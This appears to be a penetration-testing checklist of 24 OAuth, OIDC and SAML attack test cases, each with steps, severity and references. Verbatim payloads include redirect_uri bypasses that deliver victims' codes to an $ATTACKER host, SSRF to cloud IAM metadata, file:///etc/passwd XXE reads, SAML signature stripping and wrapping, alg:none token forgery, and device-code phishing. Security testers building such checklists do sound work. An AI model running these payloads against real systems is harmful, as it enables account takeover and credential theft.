# OAuth / OIDC / SAML — Checklist

Expert per-attack **test-case matrix** for OAuth / OIDC / SAML — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*24 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## OAUTH-001 — Fingerprint protocol/grant/IdP + pull discovery
**Test Category:** Recon &amp; Fingerprint · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** The SSO flow (OAuth2/OIDC/SAML), IdP, and all authz params

**Test Steps:** 1. Identify protocol (OAuth2/OIDC/SAML), grant/flow (auth-code/+PKCE/implicit/hybrid/device), and IdP (Google/MS/Okta/Auth0/Apple/custom).<br>2. Pull OIDC discovery: /.well-known/openid-configuration; save jwks_uri. SAML: SP- vs IdP-initiated.<br>3. Capture ALL authz params (client_id, redirect_uri, response_type, response_mode, scope, state, nonce, code_challenge, prompt) and full SAMLRequest/Response/RelayState decoded.

**Expected Result:** The exact flow, IdP, keys, and every tamperable parameter are recorded.

**Payload Example:**

```
curl $IDP/.well-known/openid-configuration | jq . ; capture /authorize?client_id=...&redirect_uri=...
```

**Impact:** You cannot attack a handshake you haven't fully written down; this scopes every later test.

**Tools:** Burp Suite Pro, EsPReSSO, jq

**References:** CWE-287; OWASP: OAuth2 / SAML Security Cheat Sheet; RFC 9700 (OAuth Security BCP)

---

## OAUTH-002 — redirect_uri bypass -&gt; code/token theft
**Test Category:** redirect_uri · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** The redirect_uri parameter at /authorize

**Test Steps:** 1. Swap redirect_uri for each bypass: suffix (app.example.com.evil.com), substring, loose subdomain, @-userinfo (app.example.com@evil.com), #fragment, backslash, encoded traversal, localhost/127.0.0.1, empty (fallback-to-registered).<br>2. Path traversal to a reflecting/open-redirect endpoint on the ALLOWED host.<br>3. CRITICAL: confirm the code/token is actually DELIVERED to a host you control - reflection alone is not the bug.

**Expected Result:** The IdP delivers the victim's code/token to an attacker-controlled host.

**Payload Example:**

```
redirect_uri=https://app.example.com@$ATTACKER/callback ; .../callback/../redirect?url=https://$ATTACKER
```

**Impact:** The #1 OAuth bug: victim's auth code/token stolen -&gt; account takeover. Critical.

**Tools:** poc/oauth_redirect_fuzz.py, Burp

**References:** CWE-287; CWE-601; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities

---

## OAUTH-003 — redirect_uri parameter pollution
**Test Category:** redirect_uri · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** /authorize accepting duplicate redirect_uri

**Test Steps:** 1. Send two redirect_uri (validator vs issuer differential): one registered, one attacker.<br>2. Also &amp;redirect_uri=registered%26redirect_uri=attacker.<br>3. Confirm the code lands on your host.

**Expected Result:** The validator reads the registered URI while the issuer uses the attacker's.

**Payload Example:**

```
?redirect_uri=https://app.example.com/callback&redirect_uri=https://$ATTACKER/
```

**Impact:** Code/token theft via parser disagreement -&gt; ATO. Critical.

**Tools:** Burp Repeater

**References:** CWE-287; HackTricks: OAuth to Account Takeover

---

## OAUTH-004 — state missing / not-validated / not-bound
**Test Category:** state / CSRF · **Severity:** Medium · **CVSS:** 5.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)

**Where to Test / Injection Point:** The state parameter across request and callback

**Test Steps:** 1. Omit state on request AND callback -&gt; still logs in? = CSRF-able.<br>2. Constant/changed state accepted; state from user A's flow accepted in user B's session (not session-bound); predictable state.<br>3. A missing state with NO working CSRF/ATO is Info only.

**Expected Result:** The callback is accepted without a session-bound state.

**Payload Example:**

```
GET /callback?code=AAA  (no state) ; reuse userA state in userB session
```

**Impact:** Enables login CSRF / account-linking ATO (only a finding with a working attack). Medium/High.

**Tools:** Burp Repeater

**References:** CWE-287; CWE-352; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities

---

## OAUTH-005 — Account-linking CSRF -&gt; silent ATO
**Test Category:** state / CSRF · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** A 'link social account' feature with weak/absent state

**Test Steps:** 1. Capture YOUR OWN code from the link flow; do NOT complete it.<br>2. Send the victim (logged into their account) a pre-baked callback carrying YOUR code: /social/callback?code=&lt;ATTACKER_CODE&gt;.<br>3. Their browser links YOUR identity onto their account -&gt; you log in via social into their account.

**Expected Result:** The victim's account links to the attacker's social identity on one click.

**Payload Example:**

```
https://app.example.com/social/callback?code=<ATTACKER_CODE>&state=<if_any>
```

**Impact:** Silent account takeover via account-linking CSRF - Critical (one victim click).

**Tools:** Burp Repeater

**References:** CWE-287; CWE-352; HackTricks: OAuth to Account Takeover

---

## OAUTH-006 — Authorization-code replay
**Test Category:** code / PKCE · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** The /token endpoint

**Test Steps:** 1. Redeem the code once, then redeem the SAME code again.<br>2. If the second redemption also issues tokens, the code is replayable.<br>3. Re-arms a stolen code even after the victim's client used it.

**Expected Result:** The same authorization code yields tokens more than once.

**Payload Example:**

```
POST /oauth/token grant_type=authorization_code code=$CODE ... (repeat) -> tokens again
```

**Impact:** Code replay extends the window for a stolen code -&gt; ATO. High/Critical.

**Tools:** curl, Burp Repeater

**References:** CWE-287; CWE-384; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities

---

## OAUTH-007 — redirect_uri mismatch at /token + cross-client code
**Test Category:** code / PKCE · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** The /token endpoint (RFC 9700 binding checks)

**Test Steps:** 1. Redeem the code with a DIFFERENT/omitted redirect_uri at /token (must match /authorize per RFC).<br>2. Redeem the code under a different client_id.<br>3. Any acceptance = a binding gap re-arming stolen codes.

**Expected Result:** The token endpoint accepts a mismatched redirect_uri or a different client for the code.

**Payload Example:**

```
POST /token code=$CODE redirect_uri=https://$ATTACKER/ client_id=$CID ; or omit redirect_uri
```

**Impact:** Weak code binding lets a stolen/cross-client code be redeemed -&gt; ATO. High.

**Tools:** curl

**References:** CWE-287; OWASP: OAuth2 / SAML Security Cheat Sheet; RFC 9700 (OAuth Security BCP)

---

## OAUTH-008 — PKCE omission / downgrade / verifier not checked
**Test Category:** code / PKCE · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** Public clients using PKCE

**Test Steps:** 1. At /authorize omit code_challenge, or set code_challenge_method=plain (downgrade).<br>2. At /token redeem with NO code_verifier -&gt; tokens issued? = PKCE optional.<br>3. Redeem with a WRONG code_verifier -&gt; accepted? = not checked. (PKCE absent on a confidential server-side client is NOT a bug.)

**Expected Result:** The token endpoint issues tokens without a correct code_verifier.

**Payload Example:**

```
code_challenge_method=plain ; POST /token code=$CODE client_id=$CID  (no/wrong code_verifier)
```

**Impact:** PKCE bypass re-enables stolen-code ATO on public clients. High.

**Tools:** poc/oauth_flow_audit.py

**References:** CWE-287; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities

---

## OAUTH-009 — response_type / response_mode downgrade to leakier channel
**Test Category:** response_type / mode · **Severity:** High · **CVSS:** 7.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** response_type and response_mode at /authorize

**Test Steps:** 1. Downgrade response_type=code -&gt; token / id_token token (token in #fragment, stealable via open redirect).<br>2. response_mode=form_post -&gt; query (leakier); web_message postMessage -&gt; test listener origin check with prompt=none (silent).<br>3. Confirm the credential moves to a channel you can read.

**Expected Result:** The credential is delivered via a leakier channel you control.

**Payload Example:**

```
response_type=token ; response_mode=web_message + prompt=none ; response_mode=query
```

**Impact:** Moves the token to a stealable channel -&gt; ATO. High/Critical.

**Tools:** Burp Repeater

**References:** CWE-287; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities

---

## OAUTH-010 — Scope escalation / silent grant (prompt=none)
**Test Category:** scope · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** The scope parameter and prompt=none

**Test Steps:** 1. Add scopes: scope=openid profile email offline_access admin read:all.<br>2. prompt=none silent auth -&gt; are new scopes granted without consent?<br>3. offline_access -&gt; a long-lived refresh token.

**Expected Result:** Elevated scopes / a refresh token are granted without user consent.

**Payload Example:**

```
scope=openid profile email offline_access admin ; prompt=none
```

**Impact:** Silent scope escalation / persistent refresh-token grant - Medium/High.

**Tools:** Burp Repeater

**References:** CWE-287; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities

---

## OAUTH-011 — OIDC id_token forgery (alg:none / aud / iss / nonce)
**Test Category:** OIDC id_token · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Wherever the SP consumes an id_token (callback body / id_token param / hybrid)

**Test Steps:** 1. alg:none - strip the signature and set email=$VICTIM, email_verified=true.<br>2. aud/iss confusion: present an id_token minted for a DIFFERENT client you control; if aud isn't pinned to this client_id -&gt; accepted.<br>3. nonce missing/reused -&gt; replay. kid/jku injection -&gt; attacker JWKS (hand to the JWT kit).

**Expected Result:** The SP accepts a forged/substituted id_token and logs you in as the victim.

**Payload Example:**

```
python3 poc/idtoken_tamper.py --token $IDTOKEN --alg-none --set email=$VICTIM --set email_verified=true
```

**Impact:** Full ATO via id_token forgery/substitution - Critical.

**Tools:** poc/idtoken_tamper.py, jwt_tool

**References:** CWE-287; CWE-347; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities

---

## OAUTH-012 — Unverified email / email_verified:false trusted
**Test Category:** Trust &amp; Linking · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SSO callback that links/authenticates by email

**Test Steps:** 1. Does the SP honor email_verified:false or ignore it entirely?<br>2. Sign in via an IdP where you set an unverified email matching a victim.<br>3. If the app links by email without re-verification -&gt; takeover.

**Expected Result:** The app authenticates/links based on an unverified email claim.

**Payload Example:**

```
id_token email=$VICTIM email_verified=false -> app still links/logs in
```

**Impact:** ATO via trusted-unverified-email - Critical, no crypto needed.

**Tools:** Burp Repeater

**References:** CWE-287; HackTricks: OAuth to Account Takeover

---

## OAUTH-013 — Pre-account-takeover (seed victim email first)
**Test Category:** Trust &amp; Linking · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Apps that merge password + SSO accounts by email

**Test Steps:** 1. Register $VICTIM (an email you own) by PASSWORD before the victim.<br>2. Victim later 'Sign in with Google/OIDC' as that email.<br>3. SP merges by email -&gt; shared account, YOUR password persists -&gt; ATO. Check: honors email_verified:false? links without re-verification?

**Expected Result:** The pre-seeded password account merges with the victim's SSO login.

**Payload Example:**

```
1) register $VICTIM by password  2) victim SSOs in  3) accounts merge, attacker password persists
```

**Impact:** Zero/one-click Critical ATO frequently missed - the highest-value no-crypto SSO bug.

**Tools:** Burp Repeater

**References:** CWE-287; HackTricks: OAuth to Account Takeover

---

## OAUTH-014 — IdP mix-up / confused deputy / dynamic client reg
**Test Category:** Trust &amp; Linking · **Severity:** High · **CVSS:** 7.4 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multi-IdP apps; the iss response param; dynamic client registration

**Test Steps:** 1. IdP mix-up: the iss response param not checked -&gt; a token from a low-trust IdP accepted.<br>2. Confused deputy: token audience not pinned -&gt; a token for another client accepted.<br>3. Open dynamic client registration abused to register a malicious client.

**Expected Result:** A token/identity from the wrong IdP/client/audience is accepted.

**Payload Example:**

```
swap iss to attacker IdP ; reuse an id_token whose aud is another client
```

**Impact:** Cross-IdP identity confusion -&gt; ATO - High/Critical.

**Tools:** Burp Repeater

**References:** CWE-287; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities

---

## OAUTH-015 — request_uri / JAR SSRF from the IdP
**Test Category:** SSRF · **Severity:** Critical · **CVSS:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L)

**Where to Test / Injection Point:** The request_uri parameter at /authorize

**Test Steps:** 1. Point request_uri at your OOB to confirm a server-side fetch.<br>2. Escalate to cloud metadata: request_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/ ; file:///etc/passwd.<br>3. One benign metadata request, then STOP (hand to SSRF kit).

**Expected Result:** The IdP fetches your internal/metadata URL; IAM creds returned.

**Payload Example:**

```
GET /authorize?client_id=X&request_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Impact:** SSRF from the IdP -&gt; cloud IAM credential theft - Critical.

**Tools:** interactsh, SSRFmap

**References:** CWE-287; CWE-918; HackTricks: OAuth to Account Takeover

---

## OAUTH-016 — SAML signature exclusion / stripping
**Test Category:** SAML · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** The SAMLResponse assertion

**Test Steps:** 1. Remove the entire &lt;ds:Signature&gt; block, set NameID to a target (admin@target.com), resubmit.<br>2. Also: an UNSIGNED assertion inside a signed Response trusted?<br>3. Many SPs fall to strip immediately - try it first.

**Expected Result:** The SP accepts an assertion with no/removed signature.

**Payload Example:**

```
delete <ds:Signature> ; <saml:NameID>admin@target.com</saml:NameID> ; re-base64 -> POST
```

**Impact:** Authentication bypass / log in as any identity via signature stripping - Critical.

**Tools:** SAML Raider, poc/saml_xsw.py

**References:** CWE-287; CWE-347; HackTricks: OAuth to Account Takeover

---

## OAUTH-017 — SAML XML Signature Wrapping (XSW 1-8)
**Test Category:** SAML · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** The SAMLResponse (signed) assertion

**Test Steps:** 1. Inject a forged assertion so the signature references the original but the app reads the forged one.<br>2. Run all 8 XSW patterns (SAML Raider): sibling Response/Assertion, before/after, copied signature, hidden-in-Extensions.<br>3. Set NameID to your target; at least one variant is often accepted.

**Expected Result:** An XSW-wrapped forged assertion is trusted while the signature validates the original.

**Payload Example:**

```
SAML Raider -> apply XSW1..8 with NameID=admin@target.com
```

**Impact:** Log in as any identity via signature wrapping - Critical.

**Tools:** SAML Raider, poc/saml_xsw.py

**References:** CWE-287; CWE-347; PayloadsAllTheThings/OAuth

---

## OAUTH-018 — SAML comment / canonicalization injection in NameID
**Test Category:** SAML · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** The NameID element

**Test Steps:** 1. Insert an XML comment to split the parsed value: admin@target.com&lt;!----&gt;.evil.com.<br>2. Some parsers return only the pre-comment text -&gt; the SP sees admin@target.com.<br>3. Resubmit and confirm login as the truncated identity.

**Expected Result:** A comment causes the parser to read a different NameID than was signed.

**Payload Example:**

```
<saml:NameID>admin@target.com<!--x-->evil</saml:NameID>
```

**Impact:** Log in as another user via canonicalization/comment parsing - Critical.

**Tools:** SAML Raider

**References:** CWE-287; HackTricks: OAuth to Account Takeover

---

## OAUTH-019 — SAML cert faking / key confusion + algorithm downgrade
**Test Category:** SAML · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** The &lt;ds:X509Certificate&gt; / SignatureMethod

**Test Steps:** 1. Re-sign the full assertion with YOUR key; replace &lt;ds:X509Certificate&gt; with YOUR cert.<br>2. If the SP validates against the EMBEDDED cert (not a pinned IdP cert) -&gt; total forge.<br>3. Also test algorithm downgrade / weak alg.

**Expected Result:** The SP validates against the attacker-embedded cert, accepting a fully forged assertion.

**Payload Example:**

```
xmlsec1 re-sign with attacker key + swap <ds:X509Certificate> ; downgrade SignatureMethod
```

**Impact:** Total assertion forgery -&gt; log in as anyone - Critical.

**Tools:** SAML Raider, xmlsec1

**References:** CWE-287; CWE-347; HackTricks: OAuth to Account Takeover

---

## OAUTH-020 — SAML replay / binding / RelayState / XXE
**Test Category:** SAML · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** SAMLResponse timing, Recipient/Destination/Audience, InResponseTo, RelayState, XML parser

**Test Steps:** 1. Replay a captured SAMLResponse in a fresh session / after logout; check NotBefore/NotOnOrAfter enforcement.<br>2. Cross-SP replay: change Recipient/Destination/Audience; strip InResponseTo (IdP-initiated injection).<br>3. RelayState=https://$ATTACKER (open redirect) / "&gt;&lt;script&gt; (XSS). XXE in the SAML parser (DOCTYPE entity -&gt; file read/OOB).

**Expected Result:** The SP accepts a replayed/cross-SP assertion, or RelayState/XXE is exploitable.

**Payload Example:**

```
resubmit SAMLResponse after logout ; RelayState=https://$ATTACKER ; <!DOCTYPE[<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
```

**Impact:** Assertion replay / cross-SP ATO / open-redirect / XXE file-read - High/Critical.

**Tools:** SAML Raider, interactsh

**References:** CWE-287; CWE-611; CWE-601; HackTricks: OAuth to Account Takeover

---

## OAUTH-021 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: 'state missing' with NO working CSRF/ATO (Info only); redirect_uri REFLECTED but code/token NOT delivered to you; id_token readable / SAML base64-visible (normal); a tampered assertion the server REJECTED; PKCE absent on a CONFIDENTIAL client; a SAMLResponse that 'replays' only in the SAME browser session.<br>2. REQUIRE: you actually LOGGED IN as an identity you shouldn't have.

**Expected Result:** Only findings where you logged in as an unauthorized identity survive.

**Payload Example:**

```
reflected redirect_uri = not delivered = FP ; readable id_token = normal ; rejected assertion = FP
```

**Impact:** Protects credibility; SSO is dense with observation-mistaken-for-exploit false positives.

**Tools:** manual

**References:** CWE-287; PortSwigger Web Security Academy: OAuth 2.0 authentication vulnerabilities

---

## OAUTH-022 — Client-facing impact &amp; SAFE-PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with impact: account takeover; confirm reach (all users/admin) and interaction (zero/one-click); note SSO ATO usually SKIPS MFA (argue severity up).<br>2. Provide the tampered request/assertion and proof you logged in as the victim (or landed the code/token on your listener).<br>3. Set CVSS 3.1 + CWE-287 (+601/918/347/352). Remediation: exact-match registered redirect_uri, enforce session-bound state + nonce + PKCE, pin aud/iss, verify signatures (reject alg:none/XSW/unsigned), require verified email before linking, pin the IdP cert.<br>4. Own accounts only, exfil to your listener, one benign SSRF/metadata request then STOP, delete seeded accounts; de-dupe.

**Expected Result:** A reproducible, correctly-rated, safe two-account PoC with clear remediation.

**Payload Example:**

```
PoC: tampered request/assertion + proof of login-as-victim (or code on listener) + CVSS + CWE-287 + remediation.
```

**Impact:** Converts the ATO into a defensible Critical report at the right severity (MFA-bypass argued).

**Tools:** CVSS calculator, OAUTH_REPORT_TEMPLATE.md

**References:** CWE-287; CWE-601; CWE-347; FIRST CVSS v3.1; OWASP: OAuth2 / SAML Security Cheat Sheet; RFC 9700 (OAuth Security BCP)  |  TOP REFERENCES: Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; epi052 SAML research; PayloadsAllTheThings

---

## OAUTH-023 — Device authorization code phishing (RFC 8628)
**Test Category:** code / PKCE · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Device-code flow (user_code / verification_uri)

**Test Steps:** 1. Start the device flow; obtain user_code + verification_uri<br>2. Phish the victim to approve the user_code on the real site<br>3. Poll /token; obtain the victim's access/refresh token<br>4. Note the missing device&lt;-&gt;approver binding and unclear app/scope

**Expected Result:** Device flow shows app+scope, binds approval to the device, rate-limits polling

**Payload Example:**

```
POST /oauth/device/code -> phish user_code -> poll grant_type=urn:ietf:params:oauth:grant-type:device_code
```

**Impact:** Device-code phishing -&gt; victim-approved token issuance -&gt; account takeover

**Tools:** Burp, custom poller

**References:** CWE-287; RFC 8628; Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research

---

## OAUTH-024 — Account-linking CSRF (bind attacker identity to victim)
**Test Category:** Trust &amp; Linking · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth link/connect endpoint under cookie auth (missing state)

**Test Steps:** 1. Begin linking your attacker OAuth identity; capture the link callback<br>2. Confirm the linking endpoint lacks a state/CSRF token<br>3. Deliver the callback to a logged-in victim (cross-site)<br>4. Victim's account is now linked to the attacker identity -&gt; attacker logs in as victim

**Expected Result:** Linking endpoint enforces a state/CSRF token + re-auth of the primary account

**Payload Example:**

```
GET /oauth/link/callback?code=<attacker_code>  fired cross-site at a logged-in victim
```

**Impact:** Account-linking CSRF -&gt; attacker OAuth identity bound to victim account -&gt; ATO

**Tools:** Burp

**References:** CWE-352; CWE-287; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger OAuth; disclosed pre-linking ATO writeups

---
